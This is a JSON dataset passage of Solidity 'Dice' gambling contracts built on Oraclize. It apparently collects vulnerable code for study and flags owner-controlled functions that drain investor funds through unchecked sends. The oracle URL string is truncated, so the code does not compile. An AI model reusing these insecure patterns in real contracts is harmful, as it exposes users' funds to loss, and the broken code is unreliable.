networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n address oraclizeAddr = OAR.getAddress();\n if (oraclizeAddr == 0){\n oraclize_setNetwork(networkID_auto);\n oraclizeAddr = OAR.getAddress();\n }\n oraclize = OraclizeI(oraclizeAddr);\n _\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed);\n return true;\n }\n if (getCodeSize(0x9efbea6358bed926b293d2ce63a730d6d98d43dd)>0){\n OAR = OraclizeAddrResolverI(0x9efbea6358bed926b293d2ce63a730d6d98d43dd);\n return true;\n }\n if (getCodeSize(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf)>0){\n OAR = OraclizeAddrResolverI(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf);\n return true;\n }\n return false;\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int)\n {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string){\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n return mint;\n }\n}\ncontract Dice is usingOraclize {\n uint public pwin = 5000;\n uint public edge = 200;\n uint public maxWin = 100;\n uint public minBet = 1 finney;\n uint public maxInvestors = 5;\n uint public ownerEdge = 50;\n uint public divestFee = 50;\n uint constant safeGas = 25000;\n uint constant oraclizeGasLimit = 150000;\n struct Investor {\n address user;\n uint capital;\n }\n mapping(uint => Investor) investors;\n uint public numInvestors = 0;\n mapping(address => uint) investorIDs;\n uint public invested = 0;\n address owner;\n bool public isStopped;\n struct Bet {\n address user;\n uint bet;\n uint roll;\n uint fee;\n }\n mapping (bytes32 => Bet) bets;\n bytes32[] betsKeys;\n uint public amountWagered = 0;\n int public profit = 0;\n int public takenProfit = 0;\n int public ownerProfit = 0;\n function Dice(uint pwinInitial, uint edgeInitial, uint maxWinInitial, uint minBetInitial, uint maxInvestorsInitial, uint ownerEdgeInitial, uint divestFeeInitial) {\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n pwin = pwinInitial;\n edge = edgeInitial;\n maxWin = maxWinInitial;\n minBet = minBetInitial;\n maxInvestors = maxInvestorsInitial;\n ownerEdge = ownerEdgeInitial;\n divestFee = divestFeeInitial;\n owner = msg.sender;\n }\n function() {\n bet();\n }\n function bet() {\n if (isStopped) throw;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n if (msg.value < oraclizeFee) throw;\n uint betValue = msg.value - oraclizeFee;\n if ((((betValue * ((10000 - edge) - pwin)) / pwin ) <= (maxWin * getBankroll()) / 10000) && (betValue >= minBet)) {\n bytes32 myid = oraclize_query(\"URL\", \"json(https:\n bets[myid] = Bet(msg.sender, betValue, 0, oraclizeFee);\n betsKeys.push(myid);\n } else {\n throw;\n }\n }\n function numBets() constant returns(uint) {\n return betsKeys.length;\n }\n function minBetAmount() constant returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n return oraclizeFee+minBet;\n }\n function safeSend(address addr, uint value) internal {\n if (!(addr.call.gas(safeGas).value(value)())){\n ownerProfit += int(value);\n }\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n if (msg.sender != oraclize_cbAddress()) throw;\n Bet thisBet = bets[myid];\n if (thisBet.bet>0) {\n if ((isStopped == false)&&(((thisBet.bet * ((10000 - edge) - pwin)) / pwin ) <= maxWin * getBankroll() / 10000)) {\n uint roll = parseInt(result);\n if (roll<1 || roll>10000){\n safeSend(thisBet.user, thisBet.bet);\n return;\n }\n bets[myid].roll = roll;\n int profitDiff;\n if (roll-1 < pwin) {\n uint winAmount = (thisBet.bet * (10000 - edge)) / pwin;\n safeSend(thisBet.user, winAmount);\n profitDiff = int(thisBet.bet - winAmount);\n } else {\n safeSend(thisBet.user, 1);\n profitDiff = int(thisBet.bet) - 1;\n }\n ownerProfit += (profitDiff*int(ownerEdge))/10000;\n profit += profitDiff-(profitDiff*int(ownerEdge))/10000;\n amountWagered += thisBet.bet;\n } else {\n safeSend(thisBet.user, thisBet.bet);\n }\n }\n }\n function getBet(uint id) constant returns(address, uint, uint, uint) {\n if(id<betsKeys.length)\n {\n bytes32 betKey = betsKeys[id];\n return (bets[betKey].user, bets[betKey].bet, bets[betKey].roll, bets[betKey].fee);\n }\n }\n function invest() {\n if (isStopped) throw;\n if (investorIDs[msg.sender]>0) {\n rebalance();\n investors[investorIDs[msg.sender]].capital += msg.value;\n invested += msg.value;\n } else {\n rebalance();\n uint investorID = 0;\n if (numInvestors<maxInvestors) {\n investorID = ++numInvestors;\n } else {\n for (uint i=1; i<=numInvestors; i++) {\n if (investors[i].capital<msg.value && (investorID==0 || investors[i].capital<investors[investorID].capital)) {\n investorID = i;\n }\n }\n }\n if (investorID>0) {\n if (investors[investorID].capital>0) {\n divest(investors[investorID].user, investors[investorID].capital);\n investorIDs[investors[investorID].user] = 0;\n }\n if (investors[investorID].capital == 0 && investorIDs[investors[investorID].user] == 0) {\n investors[investorID].user = msg.sender;\n investors[investorID].capital = msg.value;\n invested += msg.value;\n investorIDs[msg.sender] = investorID;\n } else {\n throw;\n }\n } else {\n throw;\n }\n }\n }\n function rebalance() private {\n if (takenProfit != profit) {\n uint newInvested = 0;\n uint initialBankroll = getBankroll();\n for (uint i=1; i<=numInvestors; i++) {\n investors[i].capital = getBalance(investors[i].user);\n newInvested += investors[i].capital;\n }\n invested = newInvested;\n if (newInvested != initialBankroll && numInvestors>0) {\n ownerProfit += int(initialBankroll - newInvested);\n invested += (initialBankroll - newInvested);\n }\n takenProfit = profit;\n }\n }\n function divest(address user, uint amount) private {\n if (investorIDs[user]>0) {\n rebalance();\n if (amount>getBalance(user)) {\n amount = getBalance(user);\n }\n investors[investorIDs[user]].capital -= amount;\n invested -= amount;\n uint newAmount = (amount*divestFee)/10000;\n ownerProfit += int(newAmount);\n safeSend(user, (amount-newAmount));\n }\n }\n function divest(uint amount) {\n if (msg.value>0) throw;\n divest(msg.sender, amount);\n }\n function divest() {\n if (msg.value>0) throw;\n divest(msg.sender, getBalance(msg.sender));\n }\n function getBalance(address user) constant returns(uint) {\n if (investorIDs[user]>0 && invested>0) {\n return investors[investorIDs[user]].capital * getBankroll() / invested;\n } else {\n return 0;\n }\n }\n function getBankroll() constant returns(uint) {\n uint bankroll = uint(int(invested)+profit+ownerProfit-takenProfit);\n if (this.balance < bankroll){\n log0(\"bankroll_mismatch\");\n bankroll = this.balance;\n }\n return bankroll;\n }\n function getMinInvestment() constant returns(uint) {\n if (numInvestors<maxInvestors) {\n return 0;\n } else {\n uint investorID;\n for (uint i=1; i<=numInvestors; i++) {\n if (investorID==0 || getBalance(investors[i].user)<getBalance(investors[investorID].user)) {\n investorID = i;\n }\n }\n return getBalance(investors[investorID].user);\n }\n }\n function getStatus() constant returns(uint, uint, uint, uint, uint, uint, int, uint, uint) {\n return (getBankroll(), pwin, edge, maxWin, minBet, amountWagered, profit, getMinInvestment(), betsKeys.length);\n }\n function stopContract() {\n if (owner != msg.sender) throw;\n isStopped = true;\n }\n function resumeContract() {\n if (owner != msg.sender) throw;\n isStopped = false;\n }\n function forceDivestAll() {\n forceDivestAll(false);\n }\n function forceDivestAll(bool ownerTakeChangeAndProfit) {\n if (owner != msg.sender) throw;\n for (uint investorID=1; investorID<=numInvestors; investorID++) {\n divest(investors[investorID].user, getBalance(investors[investorID].user));\n }\n if (ownerTakeChangeAndProfit) owner.send(this.balance);\n }\n function ownerTakeProfit() {\n ownerTakeProfit(false);\n }\n function ownerTakeProfit(bool takeChange) {\n if (owner != msg.sender) throw;\n if (takeChange){\n uint investorsCapital = 0;\n for (uint i=1; i<=numInvestors; i++) {\n investorsCapital += investors[i].capital;\n }\n if ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\n owner.send(this.balance);\n ownerProfit = 0;\n }\n } else {\n owner.send(uint(ownerProfit));\n ownerProfit = 0;\n }\n }\n}",
  "extract_feature": [
    "function forceDivestAll(bool ownerTakeChangeAndProfit) {\nif (owner != msg.sender) throw;\nfor (uint investorID=1; investorID<=numInvestors; investorID++) {\ndivest(investors[investorID].user, getBalance(investors[investorID].user));\n}\nif (ownerTakeChangeAndProfit) owner.send(this.balance);\n}",
    "function ownerTakeProfit(bool takeChange) {\nif (owner != msg.sender) throw;\nif (takeChange){\nuint investorsCapital = 0;\nfor (uint i=1; i<=numInvestors; i++) {\ninvestorsCapital += investors[i].capital;\n}\nif ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\nowner.send(this.balance);\nownerProfit = 0;\n}\n} else {\nowner.send(uint(ownerProfit));\nownerProfit = 0;\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db7fcb296bdecdb163f"
  },
  "filename": "40462.sol",
  "content": "contract OraclizeI {\n address public cbAddress;\n function query(uint _timestamp, string _datasource, string _arg) returns (bytes32 _id);\n function query_withGasLimit(uint _timestamp, string _datasource, string _arg, uint _gaslimit) returns (bytes32 _id);\n function query2(uint _timestamp, string _datasource, string _arg1, string _arg2) returns (bytes32 _id);\n function query2_withGasLimit(uint _timestamp, string _datasource, string _arg1, string _arg2, uint _gaslimit) returns (bytes32 _id);\n function getPrice(string _datasource) returns (uint _dsprice);\n function getPrice(string _datasource, uint gaslimit) returns (uint _dsprice);\n function useCoupon(string _coupon);\n function setProofType(byte _proofType);\n}\ncontract OraclizeAddrResolverI {\n function getAddress() returns (address _addr);\n}\ncontract usingOraclize {\n uint constant day = 60*60*24;\n uint constant week = 60*60*24*7;\n uint constant month = 60*60*24*30;\n byte constant proofType_NONE = 0x00;\n byte constant proofType_TLSNotary = 0x10;\n byte constant proofStorage_IPFS = 0x01;\n uint8 constant networkID_auto = 0;\n uint8 constant networkID_mainnet = 1;\n uint8 constant networkID_testnet = 2;\n uint8 constant networkID_morden = 2;\n uint8 constant networkID_consensys = 161;\n OraclizeAddrResolverI OAR;\n OraclizeI oraclize;\n modifier oraclizeAPI {\n address oraclizeAddr = OAR.getAddress();\n if (oraclizeAddr == 0){\n oraclize_setNetwork(networkID_auto);\n oraclizeAddr = OAR.getAddress();\n }\n oraclize = OraclizeI(oraclizeAddr);\n _\n }\n modifier coupon(string code){\n oraclize = OraclizeI(OAR.getAddress());\n oraclize.useCoupon(code);\n _\n }\n function oraclize_setNetwork(uint8 networkID) internal returns(bool){\n if (getCodeSize(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed)>0){\n OAR = OraclizeAddrResolverI(0x1d3b2638a7cc9f2cb3d298a3da7a90b67e5506ed);\n return true;\n }\n if (getCodeSize(0x9efbea6358bed926b293d2ce63a730d6d98d43dd)>0){\n OAR = OraclizeAddrResolverI(0x9efbea6358bed926b293d2ce63a730d6d98d43dd);\n return true;\n }\n if (getCodeSize(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf)>0){\n OAR = OraclizeAddrResolverI(0x20e12a1f859b3feae5fb2a0a32c18f5a65555bbf);\n return true;\n }\n return false;\n }\n function oraclize_query(string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(0, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query.value(price)(timestamp, datasource, arg);\n }\n function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(0, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource);\n if (price > 1 ether + tx.gasprice*200000) return 0;\n return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);\n }\n function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){\n uint price = oraclize.getPrice(datasource, gaslimit);\n if (price > 1 ether + tx.gasprice*gaslimit) return 0;\n return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);\n }\n function oraclize_cbAddress() oraclizeAPI internal returns (address){\n return oraclize.cbAddress();\n }\n function oraclize_setProof(byte proofP) oraclizeAPI internal {\n return oraclize.setProofType(proofP);\n }\n function getCodeSize(address _addr) constant internal returns(uint _size) {\n assembly {\n _size := extcodesize(_addr)\n }\n }\n function parseAddr(string _a) internal returns (address){\n bytes memory tmp = bytes(_a);\n uint160 iaddr = 0;\n uint160 b1;\n uint160 b2;\n for (uint i=2; i<2+2*20; i+=2){\n iaddr *= 256;\n b1 = uint160(tmp[i]);\n b2 = uint160(tmp[i+1]);\n if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;\n else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;\n if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;\n else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;\n iaddr += (b1*16+b2);\n }\n return address(iaddr);\n }\n function strCompare(string _a, string _b) internal returns (int) {\n bytes memory a = bytes(_a);\n bytes memory b = bytes(_b);\n uint minLength = a.length;\n if (b.length < minLength) minLength = b.length;\n for (uint i = 0; i < minLength; i ++)\n if (a[i] < b[i])\n return -1;\n else if (a[i] > b[i])\n return 1;\n if (a.length < b.length)\n return -1;\n else if (a.length > b.length)\n return 1;\n else\n return 0;\n }\n function indexOf(string _haystack, string _needle) internal returns (int)\n {\n bytes memory h = bytes(_haystack);\n bytes memory n = bytes(_needle);\n if(h.length < 1 || n.length < 1 || (n.length > h.length))\n return -1;\n else if(h.length > (2**128 -1))\n return -1;\n else\n {\n uint subindex = 0;\n for (uint i = 0; i < h.length; i ++)\n {\n if (h[i] == n[0])\n {\n subindex = 1;\n while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])\n {\n subindex++;\n }\n if(subindex == n.length)\n return int(i);\n }\n }\n return -1;\n }\n }\n function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string){\n bytes memory _ba = bytes(_a);\n bytes memory _bb = bytes(_b);\n bytes memory _bc = bytes(_c);\n bytes memory _bd = bytes(_d);\n bytes memory _be = bytes(_e);\n string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);\n bytes memory babcde = bytes(abcde);\n uint k = 0;\n for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];\n for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];\n for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];\n for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];\n for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];\n return string(babcde);\n }\n function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {\n return strConcat(_a, _b, _c, _d, \"\");\n }\n function strConcat(string _a, string _b, string _c) internal returns (string) {\n return strConcat(_a, _b, _c, \"\", \"\");\n }\n function strConcat(string _a, string _b) internal returns (string) {\n return strConcat(_a, _b, \"\", \"\", \"\");\n }\n function parseInt(string _a) internal returns (uint) {\n return parseInt(_a, 0);\n }\n function parseInt(string _a, uint _b) internal returns (uint) {\n bytes memory bresult = bytes(_a);\n uint mint = 0;\n bool decimals = false;\n for (uint i=0; i<bresult.length; i++){\n if ((bresult[i] >= 48)&&(bresult[i] <= 57)){\n if (decimals){\n if (_b == 0) break;\n else _b--;\n }\n mint *= 10;\n mint += uint(bresult[i]) - 48;\n } else if (bresult[i] == 46) decimals = true;\n }\n return mint;\n }\n}\ncontract Dice is usingOraclize {\n uint public pwin = 5000;\n uint public edge = 200;\n uint public maxWin = 100;\n uint public minBet = 1 finney;\n uint public maxInvestors = 5;\n uint public ownerEdge = 50;\n uint public divestFee = 50;\n uint constant safeGas = 25000;\n uint constant oraclizeGasLimit = 150000;\n struct Investor {\n address user;\n uint capital;\n }\n mapping(uint => Investor) investors;\n uint public numInvestors = 0;\n mapping(address => uint) investorIDs;\n uint public invested = 0;\n address owner;\n bool public isStopped;\n struct Bet {\n address user;\n uint bet;\n uint roll;\n uint fee;\n }\n mapping (bytes32 => Bet) bets;\n bytes32[] betsKeys;\n uint public amountWagered = 0;\n int public profit = 0;\n int public takenProfit = 0;\n int public ownerProfit = 0;\n function Dice(uint pwinInitial, uint edgeInitial, uint maxWinInitial, uint minBetInitial, uint maxInvestorsInitial, uint ownerEdgeInitial, uint divestFeeInitial) {\n oraclize_setProof(proofType_TLSNotary | proofStorage_IPFS);\n pwin = pwinInitial;\n edge = edgeInitial;\n maxWin = maxWinInitial;\n minBet = minBetInitial;\n maxInvestors = maxInvestorsInitial;\n ownerEdge = ownerEdgeInitial;\n divestFee = divestFeeInitial;\n owner = msg.sender;\n }\n function() {\n bet();\n }\n function bet() {\n if (isStopped) throw;\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n if (msg.value < oraclizeFee) throw;\n uint betValue = msg.value - oraclizeFee;\n if ((((betValue * ((10000 - edge) - pwin)) / pwin ) <= (maxWin * getBankroll()) / 10000) && (betValue >= minBet)) {\n bytes32 myid = oraclize_query(\"URL\", \"json(https:\n bets[myid] = Bet(msg.sender, betValue, 0, oraclizeFee);\n betsKeys.push(myid);\n } else {\n throw;\n }\n }\n function numBets() constant returns(uint) {\n return betsKeys.length;\n }\n function minBetAmount() constant returns(uint) {\n uint oraclizeFee = OraclizeI(OAR.getAddress()).getPrice(\"URL\", oraclizeGasLimit);\n return oraclizeFee+minBet;\n }\n function safeSend(address addr, uint value) internal {\n if (!(addr.call.gas(safeGas).value(value)())){\n ownerProfit += int(value);\n }\n }\n function __callback(bytes32 myid, string result, bytes proof) {\n if (msg.sender != oraclize_cbAddress()) throw;\n Bet thisBet = bets[myid];\n if (thisBet.bet>0) {\n if ((isStopped == false)&&(((thisBet.bet * ((10000 - edge) - pwin)) / pwin ) <= maxWin * getBankroll() / 10000)) {\n uint roll = parseInt(result);\n if (roll<1 || roll>10000){\n safeSend(thisBet.user, thisBet.bet);\n return;\n }\n bets[myid].roll = roll;\n int profitDiff;\n if (roll-1 < pwin) {\n uint winAmount = (thisBet.bet * (10000 - edge)) / pwin;\n safeSend(thisBet.user, winAmount);\n profitDiff = int(thisBet.bet - winAmount);\n } else {\n safeSend(thisBet.user, 1);\n profitDiff = int(thisBet.bet) - 1;\n }\n ownerProfit += (profitDiff*int(ownerEdge))/10000;\n profit += profitDiff-(profitDiff*int(ownerEdge))/10000;\n amountWagered += thisBet.bet;\n } else {\n safeSend(thisBet.user, thisBet.bet);\n }\n }\n }\n function getBet(uint id) constant returns(address, uint, uint, uint) {\n if(id<betsKeys.length)\n {\n bytes32 betKey = betsKeys[id];\n return (bets[betKey].user, bets[betKey].bet, bets[betKey].roll, bets[betKey].fee);\n }\n }\n function invest() {\n if (isStopped) throw;\n if (investorIDs[msg.sender]>0) {\n rebalance();\n investors[investorIDs[msg.sender]].capital += msg.value;\n invested += msg.value;\n } else {\n rebalance();\n uint investorID = 0;\n if (numInvestors<maxInvestors) {\n investorID = ++numInvestors;\n } else {\n for (uint i=1; i<=numInvestors; i++) {\n if (investors[i].capital<msg.value && (investorID==0 || investors[i].capital<investors[investorID].capital)) {\n investorID = i;\n }\n }\n }\n if (investorID>0) {\n if (investors[investorID].capital>0) {\n divest(investors[investorID].user, investors[investorID].capital);\n investorIDs[investors[investorID].user] = 0;\n }\n if (investors[investorID].capital == 0 && investorIDs[investors[investorID].user] == 0) {\n investors[investorID].user = msg.sender;\n investors[investorID].capital = msg.value;\n invested += msg.value;\n investorIDs[msg.sender] = investorID;\n } else {\n throw;\n }\n } else {\n throw;\n }\n }\n }\n function rebalance() private {\n if (takenProfit != profit) {\n uint newInvested = 0;\n uint initialBankroll = getBankroll();\n for (uint i=1; i<=numInvestors; i++) {\n investors[i].capital = getBalance(investors[i].user);\n newInvested += investors[i].capital;\n }\n invested = newInvested;\n if (newInvested != initialBankroll && numInvestors>0) {\n ownerProfit += int(initialBankroll - newInvested);\n invested += (initialBankroll - newInvested);\n }\n takenProfit = profit;\n }\n }\n function divest(address user, uint amount) private {\n if (investorIDs[user]>0) {\n rebalance();\n if (amount>getBalance(user)) {\n amount = getBalance(user);\n }\n investors[investorIDs[user]].capital -= amount;\n invested -= amount;\n uint newAmount = (amount*divestFee)/10000;\n ownerProfit += int(newAmount);\n safeSend(user, (amount-newAmount));\n }\n }\n function divest(uint amount) {\n if (msg.value>0) throw;\n divest(msg.sender, amount);\n }\n function divest() {\n if (msg.value>0) throw;\n divest(msg.sender, getBalance(msg.sender));\n }\n function getBalance(address user) constant returns(uint) {\n if (investorIDs[user]>0 && invested>0) {\n return investors[investorIDs[user]].capital * getBankroll() / invested;\n } else {\n return 0;\n }\n }\n function getBankroll() constant returns(uint) {\n uint bankroll = uint(int(invested)+profit+ownerProfit-takenProfit);\n if (this.balance < bankroll){\n log0(\"bankroll_mismatch\");\n bankroll = this.balance;\n }\n return bankroll;\n }\n function getMinInvestment() constant returns(uint) {\n if (numInvestors<maxInvestors) {\n return 0;\n } else {\n uint investorID;\n for (uint i=1; i<=numInvestors; i++) {\n if (investorID==0 || getBalance(investors[i].user)<getBalance(investors[investorID].user)) {\n investorID = i;\n }\n }\n return getBalance(investors[investorID].user);\n }\n }\n function getStatus() constant returns(uint, uint, uint, uint, uint, uint, int, uint, uint) {\n return (getBankroll(), pwin, edge, maxWin, minBet, amountWagered, profit, getMinInvestment(), betsKeys.length);\n }\n function stopContract() {\n if (owner != msg.sender) throw;\n isStopped = true;\n }\n function resumeContract() {\n if (owner != msg.sender) throw;\n isStopped = false;\n }\n function forceDivestAll() {\n forceDivestAll(false);\n }\n function forceDivestAll(bool ownerTakeChangeAndProfit) {\n if (owner != msg.sender) throw;\n for (uint investorID=1; investorID<=numInvestors; investorID++) {\n divest(investors[investorID].user, getBalance(investors[investorID].user));\n }\n if (ownerTakeChangeAndProfit) owner.send(this.balance);\n }\n function ownerTakeProfit() {\n ownerTakeProfit(false);\n }\n function ownerTakeProfit(bool takeChange) {\n if (owner != msg.sender) throw;\n if (takeChange){\n uint investorsCapital = 0;\n for (uint i=1; i<=numInvestors; i++) {\n investorsCapital += investors[i].capital;\n }\n if ((investorsCapital == 0)&&(this.balance != uint(ownerProfit))){\n owner.send(this.balance);\n ownerProfit = 0;\n }\n } else {\n owner.send(uint(ownerProfit));\n ownerProfit = 0;\n }\n }\n}",
  "extract_feature": [
    "function forceDivestAll(bool ownerTakeChangeAndProfit) {\nif (owner != msg.sender) throw;\nfor (uint investorID=1; investorID<=numInvestors; investorID++) {\ndivest(investors[investorID].user, getBalance(investors[investorID].user));\n}\nif (ownerTakeChangeAndProfit) owner.send(this.balance);\n}",
